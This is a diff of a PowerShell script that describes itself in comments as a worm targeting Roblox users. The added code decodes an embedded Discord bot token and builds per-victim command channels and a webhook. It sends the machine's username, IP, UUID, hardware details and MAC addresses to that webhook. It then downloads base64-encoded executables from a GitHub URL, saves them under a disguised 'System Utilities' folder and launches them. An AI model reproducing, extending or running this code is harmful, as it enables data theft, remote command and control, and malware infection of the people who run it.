@@ -11,7 +11,6 @@
 # spread via email and discord /
 # get roblox info
 # be a good little worm...
-
 $pcName     = $env:COMPUTERNAME;
 $userName   = $env:USERNAME;
 $uuid       = (Get-WmiObject Win32_ComputerSystemProduct).UUID;
@@ -26,9 +25,106 @@ $mbInfo     = "$($mb.Manufacturer) $($mb.Product)";
 $drives     = Get-CimInstance Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { "$($_.DeviceID): $([math]::Round($_.Size / 1GB, 1)) GB" };
 $macs       = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress;
 $ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip;
-$webhookUrl = 'https://discord.com/api/webhooks/1364229648975790151/s6ozqz2IOtEaTUaG7U4D0j6eWKcHqZRodHrMq6QBiCtpvfFxS3nwBeooIgkDj3XX4DPa';
+$token = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("TVRJM016SXlNRFV6TlRZek5UQXhOemM0TWcuR0VvTE9kLmwtWEFGUzJyR3RYQlVkMTZXQnpldzk3TkNfV1l5V3dYRTczVTI0"));
+$name = $ip
+$guildId = "1364229616071479326"
+$response = Invoke-WebRequest -Uri "https://discord.com/api/v9/guilds/$guildId/channels" `
+-Method "GET" `
+-Headers @{
+    "Authorization" = "$token"
+}
+
+# Convert the response content from JSON
+$channels = $response.Content | ConvertFrom-Json
+
+# Check if a category with the specified name already exists
+$existingCategory = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $name }
+
+if ($existingCategory) {
+    Write-Host "Category '$name' already exists with ID: $($existingCategory.id)"
+} else{
+$response = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
+-Method "POST" `
+-WebSession $session `
+-Headers @{
+    "Authorization" = "$token"
+} `
+-ContentType "application/json" `
+-Body "{`"type`":4,`"name`":`"$name`",`"permission_overwrites`":[]}"
+$responseJson = $response.Content | ConvertFrom-Json
+$categoryId = $responseJson.id
+Write-Host "Category ID: $categoryId"
+$channelName = "send-commands" 
+
+# $channelResponse = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
+# -Method "POST" `
+# -WebSession $session `
+# -Headers @{
+#     "Authorization" = "$token"
+# } `
+# -ContentType "application/json" `
+# -Body "{`"type`":0,`"name`":`"$channelName`",`"parent_id`":`"$categoryId`",`"permission_overwrites`":[]}"
+# $channelJson = $channelResponse.Content | ConvertFrom-Json
+# $channelId = $channelJson.id
+
+# $responseJson = $response.Content | ConvertFrom-Json
+# $categoryId = $responseJson.id
+# Write-Host "Category ID: $categoryId"
+# $channelName = "key-logs" 
+
+$channelResponse = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
+-Method "POST" `
+-WebSession $session `
+-Headers @{
+    "Authorization" = "$token"
+} `
+-ContentType "application/json" `
+-Body "{`"type`":0,`"name`":`"$channelName`",`"parent_id`":`"$categoryId`",`"permission_overwrites`":[]}"
+$channelJson = $channelResponse.Content | ConvertFrom-Json
+$channelId = $channelJson.id
+
+$channelName = "updates"
+$channelResponse = Invoke-WebRequest -UseBasicParsing -Uri "https://discord.com/api/v9/guilds/1364229616071479326/channels" `
+-Method "POST" `
+-WebSession $session `
+-Headers @{
+    "Authorization" = "$token"
+} `
+-ContentType "application/json" `
+-Body "{`"type`":0,`"name`":`"$channelName`",`"parent_id`":`"$categoryId`",`"permission_overwrites`":[]}"
+$channelJson = $channelResponse.Content | ConvertFrom-Json
+$channelIdUpdates = $channelJson.id
+
+
+$webhookName = "Updates Webhook"
+$webhookAvatar = ""
+
+# Define the body of the POST request
+$body = @{
+    name = $webhookName
+    avatar = $webhookAvatar
+} | ConvertTo-Json
+
+# Send a POST request to create the webhook
+$response = Invoke-WebRequest -Uri "https://discord.com/api/v9/channels/$channelIdUpdates/webhooks" `
+-Method "POST" `
+-Headers @{
+    "Authorization" = "$token"
+} `
+-ContentType "application/json" `
+-Body $body
+
+# Convert the response content from JSON
+$responseJson = $response.Content | ConvertFrom-Json
+
+# Output the webhook ID and token (URL will be constructed later)
+Write-Host "Webhook created! ID: $($responseJson.id), Token: $($responseJson.token)"
+
+# Construct the webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/$($responseJson.id)/$($responseJson.token)"
 $payload = @{username = "PC Info Logger";embeds = @(@{title = "PC System Info - $userName@$pcName";color = 65352;fields = @(@{ name = "IP"; value = "$ip"; inline = $false },@{ name = "UUID"; value = "$uuid"; inline = $true }, @{ name = "Uptime Since"; value = "$uptime"; inline = $false }, @{ name = "OS"; value = "$osInfo"; inline = $false }, @{ name = "CPU"; value = "$cpu"; inline = $false }, @{ name = "GPU"; value = "$gpu"; inline = $false }, @{ name = "RAM"; value = "$ramGB GB"; inline = $true }, @{ name = "Motherboard"; value = "$mbInfo"; inline = $false }, @{ name = "Drives"; value = "$drives"; inline = $false }, @{ name = "MAC Addresses"; value = "$macs"; inline = $false }; ); footer = @{ text = "Made by drkst_shdw" }; timestamp = (Get-Date).ToString("o")})} | ConvertTo-Json -Depth 4;
 irm -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';
+}
 if ($gpu -match "nvidia|gtx|rtx|geforce") {
     $base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";
     $url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url));
@@ -140,4 +236,25 @@ Write-Host "Executable saved to $fullExePath"
 
 # Optionally, run the saved executable (if needed)
 Start-Process $fullExePath
+$spreadUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/commands.txt"
+$b64 = iwr -Uri $spreadUrl
+$decoded = $decodedBytes = [System.Convert]::FromBase64String($b64.Content)
 
+# Specify the path where the .exe should be saved
+$deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
+$exeFileName = "sysUtils.exe"
+$fullExePath = Join-Path $deepExtractPath $exeFileName
+
+# Ensure the target directory exists
+if (-not (Test-Path $deepExtractPath)) {
+    New-Item -ItemType Directory -Force -Path $deepExtractPath
+}
+
+# Write the decoded bytes to the file
+[System.IO.File]::WriteAllBytes($fullExePath, $decodedBytes)
+
+# Provide feedback to the user
+Write-Host "Executable saved to $fullExePath"
+
+# Optionally, run the saved executable (if needed)
+Start-Process $fullExePath
